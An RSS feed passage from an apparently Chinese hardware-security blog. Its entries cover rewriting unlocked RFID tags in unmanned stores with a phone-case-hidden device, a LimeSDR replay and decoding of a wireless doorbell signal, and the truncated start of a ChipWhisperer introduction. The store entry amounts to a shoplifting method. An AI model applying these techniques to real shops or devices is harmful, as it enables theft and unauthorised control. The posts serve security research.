<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Yaseng</title>
  
  <subtitle>Bypass the token</subtitle>
  <link href="/rss.xml" rel="self"/>
  
  <link href="http://yaseng.org/"/>
  <updated>2018-11-17T08:49:27.000Z</updated>
  <id>http://yaseng.org/</id>
  
  <author>
    <name>Yaseng</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>无人商店零元购</title>
    <link href="http://yaseng.org/free-shopping-in-unmanned-stores.html"/>
    <id>http://yaseng.org/free-shopping-in-unmanned-stores.html</id>
    <published>2018-10-25T16:00:00.000Z</published>
    <updated>2018-11-17T08:49:27.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><h3 id="新零售概念"><a href="#新零售概念" class="headerlink" title="新零售概念"></a>新零售概念</h3><p> 新零售概念提出后，零售行业创新加速，伴随着人工智能和物联网在各个领域的渗透，无人售货便利店、无人售货机的概念进入大众视野，自2016年亚马逊宣布其无人便利店项目Amazon Go准备问世以来，无人便利店像雨后春笋般涌现，在以消费者为中心的商业时代，无人便利店以其高效率、优质的服务体验和低人力成本等等优势，在未来将得到巨大市场发展。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/lo95jrf43d/image7.jpg" alt="image7"></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/lo95jrf43d/image8.jpg" alt="image8"></p><p>无人零售多采用人工智能、物联网RFID、二维码识别等技术，但是正因为新技术的引入，而导致攻击面随之扩大，RFID标签的篡改、识别信号拦截、人工智能算法欺骗、云端通信拦截等等都有可能导致大量的盗损，并因其利用简单、攻击成本低、攻击难以检测等特点，比传统商店所面临的盗损风险更大，从而严重威胁到市场发展，因此安全是无人零售行业长足发展的基石。</p><h3 id="行业发展"><a href="#行业发展" class="headerlink" title="行业发展"></a>行业发展</h3><p>2016年 新零售”一词由马云在2016年杭州云栖大会上首次提及，与新制造、新金融、新技术、新能源一起被称为未来五大新趋势。“新零售”概念强调的是线上与线下将深度结合，在现代物流加持下，结合大数据、云计算等创新技术构成的新商业模式。<br>2017年下半年，无人零售以其超前的购物体验成为新零售最受资本和消费者关注的形态之一。7月1日，F5未来商店完成3000万元A+轮融资；7月3日缤果盒子完成超1亿元A轮融资；7月8日阿里巴巴无人超市“淘咖啡”的落地亮相2017年淘宝造物节。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/lo95jrf43d/image14.jpg" alt="image14"></p><p>截至2017年9月底我国每年无人零售企业成立数。</p><h3 id="安全现状"><a href="#安全现状" class="headerlink" title="安全现状"></a>安全现状</h3><ul><li>上海一无人超市一周遭盗窃6次防盗成了大难题</li><li>成都批捕首例无人超市盗窃嫌疑人</li><li>浙江多次盗窃无人超市 三男子被刑拘</li><li>东莞两月盗窃无人超市11次 “贪心”男被刑拘</li></ul><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/lo95jrf43d/640.jpg" alt="640"></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/lo95jrf43d/6401.jpg" alt="6401"></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/lo95jrf43d/6403.jpg" alt="6403"></p><p>无人商店最大问题是开放式零售形态可能面临少数顾客逃避付款，而难以完全保证商户利益的问题。</p><h2 id="UHF标签"><a href="#UHF标签" class="headerlink" title="UHF标签"></a>UHF标签</h2><h3 id="UHF超高频远距离RFID"><a href="#UHF超高频远距离RFID" class="headerlink" title="UHF超高频远距离RFID"></a>UHF超高频远距离RFID</h3><p>特高频Ultra High Frequency(UHF)是指频率为300~3000MHz，波长在1m~1dm的无线电波。该波段的无线电波又称为分米波。UHF标签是RFID电子标签中的一种。属于无源电子标签，在阅读器的读出范围之外时，电子标签处于无源状态，在阅读器的读出范围之内时，电子标签从阅读器发出的射频能量中提取其工作所需的电源。在我国 800/900MHz 频段 UHF 技术的具体使用频率为 840-845MHz 和920-925MHz。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/lo95jrf43d/image15.jpg" alt="image15"></p><p>UHF电子标签具有识别距离远、识读率高、防冲突能力强、可扩展性好等特点，读卡距离达3－10米，每秒可读100张卡，因此UHF技术大量应用在仓储、物流盘点等场所，随着无人商店的发展，UHF技术开始广泛应用于店内的商品标识上。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/lo95jrf43d/image16.jpg" alt="image16"></p><h3 id="UHF电子标签安全问题"><a href="#UHF电子标签安全问题" class="headerlink" title="UHF电子标签安全问题"></a>UHF电子标签安全问题</h3><p>目前无人商店使用的UHF电子标签大部分采用基于EPC Class1 Gen2（简称G2）协议的标签， EPC标签内置的芯片存储有具体的数据信息，其Tag memory（标签内存）分为Reserved（保留），EPC（电子产品代码），TID（标签识别号）和User（用户）四个独立的存储区块（Bank）。 其中</p><ul><li>Reserved区，存储Kill Password（灭活口令）和Access Password（访问口令）。</li><li>EPC区：存储EPC号码等，可以对供应链中的对象（包括物品、货箱、货盘、位置等）进行全球唯一的标识，无人商店中商品的唯一识别ID即存储于EPC区。</li><li>TID区：存储标签识别号码，每个TID号码应该是唯一的。 </li><li>User区：存储用户自定义的数据。 </li></ul><p>此外还有各区块的Lock（锁定）状态位等用到的也是存储性质的单元。<br>标签收到连续波（CW）照射即上电（Power-up）以后，标签可处于Ready（准备），Arbitrate（裁断），Reply（回令），Acknowledged（应答），Open（公开），Secured（保护），Killed（灭活）七种状态之一。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/lo95jrf43d/image17.jpg" alt="image17"></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/lo95jrf43d/image18.jpg" alt="image18"></p><p>EPC区存储的唯一标识，如果标签没有进行灭活（Killed），或者没有进行锁定（Lock）或加密码保护（Secured），就能通过读写器再次进行修改，而在实际生产环节，厂商出于成本和便捷性考虑，并没有进行灭活（Killed）、锁定（Lock）、保护（Secured）等标签数据防护手段，这就导致了可以通过外部读写器改变商品标识的风险，利用专用工具，可以把高价商品的标识与低价商品标识互换，或者把已经购买过的商品标识换到未购买过的商品上，即可轻松绕过店内的监控报警系统。</p><h2 id="攻击设备"><a href="#攻击设备" class="headerlink" title="攻击设备"></a>攻击设备</h2><p>基于修改EPC区唯一标识的方法，自制了隐蔽标签修改器，把读写器天线、电池、读写模块集成在一起，然后隐藏在手机壳内部，在通过耳机接口与手机通信，在APP里面进行数据操作修改，实现最大程度的隐蔽攻击。相比传统从网络层或通信层的攻击，操作简单，没有技术门槛，任何人只要掌握了工具的操作方式，即可实现攻击，危害性和影响力更为广泛。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/lo95jrf43d/image19.jpg" alt="image19"></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/lo95jrf43d/image20.jpg" alt="image20"></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/lo95jrf43d/image21.jpg" alt="image21"></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/lo95jrf43d/image22.jpg" alt="image22"></p><h2 id="效果演示"><a href="#效果演示" class="headerlink" title="效果演示"></a>效果演示</h2><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/lo95jrf43d/20181116172418.jpg" alt=""></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/lo95jrf43d/20181116172423.jpg" alt=""></p><p>Geekpwn 2018 上海站实验室无人商店“0元购”演讲，并现场对该设备进行展示。</p><p>视频演示：  <a href="https://www.bilibili.com/video/av36079154/" target="_blank" rel="noopener">https://www.bilibili.com/video/av36079154/</a></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li>无人超市“零元购” | 挥一挥衣袖，不花钱带走一个超市  <a href="https://mp.weixin.qq.com/s/NQ9r1kLhZ33SEGZykf9fHw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/NQ9r1kLhZ33SEGZykf9fHw</a></li><li>物联网安全百科  <a href="https://iot-security.wiki/" target="_blank" rel="noopener">https://iot-security.wiki/</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;h3 id=&quot;新零售概念&quot;&gt;&lt;a href=&quot;#新零售概念&quot; class=&quot;headerlink&quot; title=&quot;新零售概念&quot;&gt;&lt;/a&gt;新零售概
      
    
    </summary>
    
      <category term="物联网安全" scheme="http://yaseng.org/categories/%E7%89%A9%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="无人超市" scheme="http://yaseng.org/tags/%E6%97%A0%E4%BA%BA%E8%B6%85%E5%B8%82/"/>
    
      <category term="无人超市安全" scheme="http://yaseng.org/tags/%E6%97%A0%E4%BA%BA%E8%B6%85%E5%B8%82%E5%AE%89%E5%85%A8/"/>
    
      <category term="无人超市破解" scheme="http://yaseng.org/tags/%E6%97%A0%E4%BA%BA%E8%B6%85%E5%B8%82%E7%A0%B4%E8%A7%A3/"/>
    
      <category term="无人超市零元购" scheme="http://yaseng.org/tags/%E6%97%A0%E4%BA%BA%E8%B6%85%E5%B8%82%E9%9B%B6%E5%85%83%E8%B4%AD/"/>
    
  </entry>
  
  <entry>
    <title>LimeSDR 无线信号重放攻击和逆向分析</title>
    <link href="http://yaseng.org/wireless-signal-replay-attack-and-reverse-with-LimeSDR.html"/>
    <id>http://yaseng.org/wireless-signal-replay-attack-and-reverse-with-LimeSDR.html</id>
    <published>2018-09-02T16:00:00.000Z</published>
    <updated>2018-09-03T11:07:40.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>在这篇文章中，我们将对某宝销量最高的一款无线门铃进行无线重放攻击和逆向分析其遥控信号的演示。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/sdrcf/5b61bb3542766.png" alt=""></p><p>国内常见的无线遥控通常工作在315Mhz、433Mhz频率，欧美的采用868Mhz、915Mhz这2个频率。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/sdrcf/5b61c47b42c4e.jpg" alt=""></p><p>拆开门铃，我们可以发现解码芯片为 <a href="http://t.cn/RkWvAOk" title="华芯微HS1527" target="_blank" rel="noopener">华芯微HS1527</a></p><p>华芯微HS1527采用CMOS工艺制造,拥有20位地址码，可提供最多达1048576(2^20)种地址码，发射频率支持315Mhz与433Mhz。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/sdrcf/5b61c4807005a.png" alt=""></p><p>我们可以用电视棒、HackRF One、LimeSDR等SDR硬件进一步确定遥控的工作频率，打开SDR软件设置频率为315Mhz或433Mhz，然后按下遥控器，能在瀑布图上看到明显的反应：<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/sdrcf/5b61bbfa80581.png" alt=""></p><p>确定无线遥控工作的中心频率为：433950000</p><h2 id="录制信号"><a href="#录制信号" class="headerlink" title="录制信号"></a>录制信号</h2><p>Grc流程图下载地址：<a href="https://1drv.ms/f/s!AsE4BpolygfCjGfspV7_Gno3rpy5" target="_blank" rel="noopener">https://1drv.ms/f/s!AsE4BpolygfCjGfspV7_Gno3rpy5</a><br>用GNU Radio搭一个简单的接收流图，一方面将接收信号保存为Cfile文件，另一方面将信号以瀑布图显示作为实时反馈。因为遥控信号是433MHz，中心频率设在这个附近都可以，采样率2M就够了。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/sdrcf/5b7d72d138260.png" alt=""></p><p>osmocom Source使用LimeSDR接收433MHz无线信号,采样率为2M，右上QT GUI Sink将捕获的无线信号通过瀑布图显示，右下角File Sink将捕获到的无线数据包储存到test.cfile文件中。<br>执行流图可看到如下效果图：<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/sdrcf/5b61bd7500b2a.png" alt=""></p><p>按下遥控：<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/sdrcf/5b61bd8141677.png" alt=""></p><p>结束GnuRadio流图后，查看Music目录下的test.cfile:<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/sdrcf/5b7d91934831f.png" alt=""></p><h2 id="重放信号"><a href="#重放信号" class="headerlink" title="重放信号"></a>重放信号</h2><p>接下来再用GNU Radio写个重放信号的流图：<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/sdrcf/5b7d74c2f234e.png" alt=""></p><p>左侧File Source调用录制到的test.cfile信号文件，与此同时QT GUI Time Sink、QT GUI Frequency Sink模块分别在屏幕上显示时间轴（时间域）、频率幅度（频率域），osmocom Sink调用LimeSDR将信号发射出去，执行流图：<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/sdrcf/5b61c0d148305.png" alt=""></p><p>如果听见铃声响起，那说明这段信号是有效的，如果没有响起，可能是录制指定的频率不对或采样到的信号样本不完整，可多次尝试录制，如果是车钥匙等其他设备，其信号只有一次或几次有效性，俗称滚动码，这点请注意。</p><h2 id="分析信号"><a href="#分析信号" class="headerlink" title="分析信号"></a>分析信号</h2><h3 id="Audacity"><a href="#Audacity" class="headerlink" title="Audacity"></a>Audacity</h3><p>Audacity是一款跨平台的音频处理软件，我们可以拿来分析射频信号。导入录制的音频信号文件进行信号分析，然后通过其展现信号波形图来判断信号的调制方式并加以分析。</p><p>不过这种方式需要肉眼将波形转化成0跟1，看起来比较容易眼花。只有<strong>老司机</strong>才能很快很准确地用这种方式完成分析任务。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/sdrcf/5b7fd6a1160cc.png" alt=""></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/sdrcf/5b7fd6a532db7.png" alt=""></p><p>导入成功后显示如下图：<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/sdrcf/5b7d8115a717e.png" alt=""></p><p>发现存在多段信号脉冲，我们选择一段信号后点击放大镜来进一步观察信号特征。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/sdrcf/5b7eebc9ca448.png" alt=""></p><p>我们将第一个宽度的蓝色条状物当作标准宽度1，空白区域当作0，空白区域的宽度能容纳几个标准宽度蓝条，就代表有几个0，以此类推，较宽的蓝色条状物能容纳几个标准宽度蓝条就代表有几个1。经验比较丰富的朋友可以通过图形，把无线射频信号转换成二进制数据</p><p><code>0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 1, 1, 1, 0, 1, 0, 1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0</code></p><h3 id="Inspectrum"><a href="#Inspectrum" class="headerlink" title="Inspectrum"></a>Inspectrum</h3><p>Inspectrum是一款分析无线信号的工具，基于Linux和OSX。它兼容GNURadio、Osmocom_fft还有各类SDR设备导出的IQ文件格式（例如RTL-SDR、HackRF、BladeRF）。</p><p>安装Inspectrum，参考Wiki：<a href="https://github.com/miek/inspectrum/wiki/Build" target="_blank" rel="noopener">https://github.com/miek/inspectrum/wiki/Build</a></p><p>澳大利亚无线黑客 <a href="https://github.com/tresacton" title="tresacton" target="_blank" rel="noopener">tresacton</a> 在 Inspectrum 的基础上做了界面优化和升级，有兴趣的朋友也可以安装 <a href="https://github.com/tresacton/dspectrumgui" title="DSpectrumGUI" target="_blank" rel="noopener">DSpectrumGUI</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get install qt5-default libfftw3-dev cmake pkg-config automake autoconf</span><br><span class="line">$ git clone https://github.com/jgaeddert/liquid-dsp.git</span><br><span class="line">$ cd liquid-dsp</span><br><span class="line">$ ./bootstrap.sh</span><br><span class="line">$ ./configure</span><br><span class="line">$ make</span><br><span class="line">$ sudo make install</span><br><span class="line">$ sudo ldconfig</span><br><span class="line">$ cd ~</span><br><span class="line">$ git clone https://github.com/miek/inspectrum.git</span><br><span class="line">$ cd inspectrum &amp;&amp; mkdir build &amp;&amp; cd build</span><br><span class="line">$ cmake ..</span><br><span class="line">$ make</span><br><span class="line">$ sudo make install</span><br><span class="line">$ sudo ldconfig</span><br></pre></td></tr></table></figure></p><p>打开Inspectrum，导入我们录制的test.cfile文件。设置采样率为录制时的采样率2M，水平拖动，找到有信号的区域。然后可以通过左侧Spectrogram参数的调节、缩放工具，实现波形图的放大缩小，颜色深浅调节。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/sdrcf/5b7edc950cb72.png" alt=""></p><p>在原始信号上右键添加采样图，Add derived plot -&gt; Add sample plot 用鼠标拖动，调节中心频率的位置和宽度；<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/sdrcf/5b7ede054a84b.png" alt=""></p><p>然后在下面的采样图右键添加阈值图，Add derived plot -&gt; Add threshold plot<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/sdrcf/5b7edf77e37ff.png" alt=""></p><p>左侧栏的Time selection可对波形进行划分，这里我们以一位<strong>“内码”</strong>信号的宽度为标准。接着对Symbols数值进行递增，直至囊括一帧信号的波形区域：<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/sdrcf/5b87c626ab7ac.png" alt=""></p><p>参考 <a href="http://t.cn/RkWvAOk" title="华芯微HS1527" target="_blank" rel="noopener">华芯微HS1527</a> 资料文档，可以得知<strong>HS1527码型</strong>：<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/sdrcf/5b87c87db56dc.jpg" alt=""></p><p>现在我们知道在 inspectrum 里面看到的信号是什么意思了，总结下：一帧信号的编码格式为<strong>“≥8位同步码 + 20位内码 + 4位数据码”</strong><br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/sdrcf/5b7ee0708914c.jpg" alt=""></p><p>然后在阈值图右键导出解码的数据，<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/sdrcf/5b87d3ff70067.png" alt=""></p><p>导出的解码数据：<br><code>0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 1, 1, 1, 0, 1, 0, 1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0</code></p><h4 id="绘制Bits数据信号的GRC流图"><a href="#绘制Bits数据信号的GRC流图" class="headerlink" title="绘制Bits数据信号的GRC流图"></a>绘制Bits数据信号的GRC流图</h4><p>前面说过一帧信号共有32位码。现在我们要绘制GRC流图，执行流图从而让LimeSDR发射出Bits数据信号。这32位码，每个码都有相应的时序进行表示。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/sdrcf/5b802837a51c2.jpg" alt=""></p><p><code>0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 1, 1, 1, 0, 1, 0, 1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0</code></p><p>解码数据换算后得到的Bits数据：</p><p><code>1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 1, 0, 1, 0, 0, 0, 1, 1, 1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 1, 1, 0, 1, 1, 1, 0, 1, 1, 1, 0, 1, 0, 0, 0, 1, 1, 1, 0, 1, 0, 0, 0, 1, 1, 1, 0, 1, 0, 0, 0, 1, 1, 1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 1, 1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 1, 1, 0, 1, 0, 0, 0</code></p><p>一个高电平或低电平对应4LCK，在采样率为2MHz的情况下占用时间宽度为1.114ms除以4。要每个电平占用1.114ms/4LCK，则需要让每个电平点插值1.114ms/4*2MHz≈557次<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/sdrcf/5b87d80615055.png" alt=""></p><ul><li>“Vector Source”作为标准的向量输出源模块，可以输出自定义矢量，如门铃的序列。参量Repeat决定是否重复地产生整组矢量数据。</li><li>“Repeat”模块是将输入的矢量进行插值复制，即将<code>&lt;a,b,c,~~~&gt;</code>复制为<code>&lt;a,a,b,b,c,c,~~~&gt;</code>。</li><li>“osmocom Sink”模块是作为发射机的数据信宿。</li><li>“WX GUI Scope Sink”模块用于查看发射出去的信号。</li></ul><h3 id="Universal-Radio-Hacker-URH"><a href="#Universal-Radio-Hacker-URH" class="headerlink" title="Universal Radio Hacker(URH)"></a>Universal Radio Hacker(URH)</h3><p>URH相⽐Audacity和Inspectrum这2款软件，特点是使用特别⽅便，包括采样、解码、重放、模拟环境等功能都可以直接在URH上面完成。而且URH⽀持市面上大多数SDR设备，支持Linux、OSX、Windows平台。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/sdrcf/5b7fdbbc5459a.png" alt=""></p><p>参考Wiki进行安装:<a href="https://github.com/jopohl/urh" target="_blank" rel="noopener">https://github.com/jopohl/urh</a> ，安装完成后打开如下图。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/sdrcf/5b7ffdc81f773.png" alt=""></p><p>打开“File”菜单,可以直接录制信号或导入录制的信号<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/sdrcf/5b87dd528d421.png" alt=""></p><p>我们点击“Record signal”进行信号录制，按下遥控，右侧会显示信号频谱。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/sdrcf/5b87dea936e97.png" alt=""></p><p>保存我们录制的信号文件，软件会自动打开文件然后回到首页。左下角我们可以设置把信号实时解调为Bits、HEX、ASCII数据流。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/sdrcf/5b87e5bee87c4.png" alt=""></p><p>还可以重放信号，实时调试。更多功能可以查看 <a href="https://github.com/jopohl/urh/releases/download/v2.0.0/userguide.pdf" title="操作使用手册" target="_blank" rel="noopener">操作使用手册</a> 进行学习。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/sdrcf/5b7ffe2d6f0fd.png" alt=""></p><h2 id="更多姿势重放信号"><a href="#更多姿势重放信号" class="headerlink" title="更多姿势重放信号"></a>更多姿势重放信号</h2><p>通过上述方式，我们已对SDR捕获到的无线信号进行分析，并把信号文件转换成了二进制数据，可使用GnuRadio对数据进行重放、修改测试。接下介绍几款硬件，可以DIY便携式信号录制、重放设备。</p><h3 id="DIY攻击设备"><a href="#DIY攻击设备" class="headerlink" title="DIY攻击设备"></a>DIY攻击设备</h3><p>我们可以使用Arduino开发板和很常见的超再生模块或者CC1101模块配合RC-Switch库制作一款便携式射频接收/重放设备。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/sdrcf/5b7d614aa3bb7.jpg" alt=""></p><h3 id="RFcat"><a href="#RFcat" class="headerlink" title="RFcat"></a>RFcat</h3><p>RFCat USB Radio Dongle能够在300 - 928MHz之间的频率上发射，接收，频谱分析，使用户能够嗅探或攻击在这些频率范围内传输的任何无线数据协议。其中包括：家庭自动化系统，智能电表，SCADA系统，“物联网”设备，移动设备等等。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/sdrcf/5b61ce4db8ce7.jpg" alt=""></p><h3 id="EZ430-Chronos"><a href="#EZ430-Chronos" class="headerlink" title="EZ430 Chronos"></a>EZ430 Chronos</h3><p>德州仪器生产的EZ430 Chronos手表由于采用了MSP430芯片，该芯片支持发射1GHz以下频率的无线信号,覆盖市面上各种常见的无线遥控频率（315MHz、433MHz、868MHz、915MHz）<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/sdrcf/5b61ce2710fdb.jpg" alt=""></p><h3 id="GoodWatch"><a href="#GoodWatch" class="headerlink" title="GoodWatch"></a>GoodWatch</h3><p>GoodWatch是逆向工程师和业余无线电爱好者必备的一款手表，它包括RPN计算器，十六进制编辑器，反汇编器和距离70厘米的无线电收发器。它由Casio 3208系列 计算器手表改装而成。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/sdrcf/5b7fffe2d0a51.jpg" alt=""></p><h3 id="YARD-Stick-One"><a href="#YARD-Stick-One" class="headerlink" title="YARD Stick One"></a>YARD Stick One</h3><p>Great Scott Gadgets 的YARD Stick One一款由美国无线电专家Michael Ossmann 最新研发的一款无线电DONGLE, 与PC通过USB端口连接，它可以用来接收、发射低于1GHz的数字无线信号,主要性能规格如下：<br>-半双工发射和接收<br>-正式操作频段：300-348 MHz, 391-464 MHz, 782-928 MHz<br>-非正式操作频段：281-361 MHz, 378-481 MHz, 749-962 MHz<br>-调制方式： ASK, OOK, GFSK, 2-FSK, 4-FSK, MSK<br>-数据传输率：高达500 kbps<br>-USB 2.0全速传输<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/sdrcf/5b61cec8190b8.png" alt=""></p><h3 id="PandwaRF"><a href="#PandwaRF" class="headerlink" title="PandwaRF"></a>PandwaRF</h3><p>PandwaRF是一款射频分析工具，由手机或PC控制的低于1 GHz的无线收发器。 其目的是非常容易地捕获，显示和传输RF数据。 它可以使用BLE或USB连接到Android智能手机，使用USB连接到Linux。 它基于着名的RfCat＆Yard Stick One工具和德州仪器CC1111 RF收发器，但具有许多新功能，使PandwaRF成为完美的便携式RF分析工具。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/sdrcf/5b87ee11aee61.jpg" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h2&gt;&lt;p&gt;在这篇文章中，我们将对某宝销量最高的一款无线门铃进行无线重放攻击和逆向分析其遥控信号的演示。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https:
      
    
    </summary>
    
      <category term="无线电安全" scheme="http://yaseng.org/categories/%E6%97%A0%E7%BA%BF%E7%94%B5%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="LimeSDR" scheme="http://yaseng.org/tags/LimeSDR/"/>
    
      <category term="无线电" scheme="http://yaseng.org/tags/%E6%97%A0%E7%BA%BF%E7%94%B5/"/>
    
      <category term="无线门铃逆向" scheme="http://yaseng.org/tags/%E6%97%A0%E7%BA%BF%E9%97%A8%E9%93%83%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>芯片物理攻击平台 ChipWhisperer 初探</title>
    <link href="http://yaseng.org/ChipWhisperer-introduce.html"/>
    <id>http://yaseng.org/ChipWhisperer-introduce.html</id>
    <published>2018-08-15T16:00:00.000Z</published>
    <updated>2018-08-25T09:32:12.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>传统基于穷举或纯数学理论层面的分析，对于现代高强度加密算法而言，算力有限导致无法实现穷举，算法的复杂性也无法通过数学工具直接破解，根据近代物理学发展出来的理论，电子设备依赖外部电源提供动力，设备在运行过程中会消耗能量，同时会跟外界环境存在声、光、电、磁等物理现象产生，设备本身也可能存在设计薄弱点，通过这些物理泄露或人为进行物理层的修改获取数据，然后运用各类数学工具和模型实现破解。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/5b5a0b1/5b757e51c171d.jpg" alt=""></p><p>(图片来源 Newae 官方)</p><p>然而在做物理攻击时，往往需要昂贵的设备，并要具备数学、物理学、微电子学、半导体学、密码学、化学等等多学科的交叉理论知识，因此其技术门槛和攻击成本都很高，目前在刚刚结束的 Blackhat 2018 上，展台上展示了多款 ChipWhisperer 硬件工具,作为亲民型的物理攻击平台，获得了一致的好评。</p><p>ChipWhisperer Lite 版官方商店售价 $250 ，不管是实验学习，还是实战入门，都是极具性价比的，本文主要介绍主流的一些物理攻击手段，以及对 ChipWhisperer 的初步认知，后续将会据此从理论、原理、实验以及实战等角度详细介绍该平台。</p><h2 id="物理攻击"><a 